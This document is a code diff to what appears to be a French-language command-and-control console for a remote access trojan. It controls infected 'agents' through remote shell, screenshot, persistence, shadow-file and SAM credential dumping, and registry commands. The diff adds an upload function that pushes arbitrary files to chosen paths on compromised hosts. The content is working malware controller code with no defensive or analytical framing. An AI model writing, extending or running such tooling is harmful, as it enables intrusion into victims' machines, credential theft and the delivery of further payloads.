@@ -210,6 +210,7 @@ def cmd_help():
   agents / use <id> / kill <id> / exit
   shell <cmd> / screenshot / sysinfo / ip / list_users
   persistence / shadow / list_home / sam / registry
+  upload <fichier_local> <dest_distante>
 """)
 
 def cmd_agents():
@@ -276,6 +277,34 @@ def cmd_screenshot():
     print(f"Screenshot sauvegardé: {filename} ({len(png_data)} octets)")
 
 
+def cmd_upload(arg):
+    if not current_agent:
+        print("Aucun agent sélectionné (use <id>)")
+        return
+    parts = arg.split(maxsplit=1)
+    if len(parts) < 2:
+        print("Usage: upload <fichier_local> <dest_distante>")
+        return
+    local_path, remote_dest = parts
+    if not os.path.isfile(local_path):
+        print(f"Fichier introuvable: {local_path}")
+        return
+    with open(local_path, "rb") as f:
+        file_data = f.read()
+    filename = os.path.basename(local_path)
+    try:
+        with current_agent.lock:
+            send_msg(current_agent.sock, {"cmd": "upload", "dest": remote_dest, "filename": filename})
+            current_agent.sock.sendall(struct.pack(">I", len(file_data)) + file_data)
+            resp = recv_response(current_agent)
+    except (ConnectionError, OSError) as e:
+        print(f"Erreur: {e}")
+        return
+    if resp:
+        afficher_reponse(resp)
+    print()
+
+
 #Boucle principale
 
 def main():
@@ -317,6 +346,8 @@ def main():
                 send_to_agent({"cmd": "shell", "command": arg}, label=f"shell: {arg}")
         elif cmd == "screenshot":
             cmd_screenshot()
+        elif cmd == "upload":
+            cmd_upload(arg)
         elif cmd in ("sysinfo", "list_users", "ip", "persistence",
                       "shadow", "list_home", "sam", "registry"):
             send_to_agent({"cmd": cmd}, label=cmd)
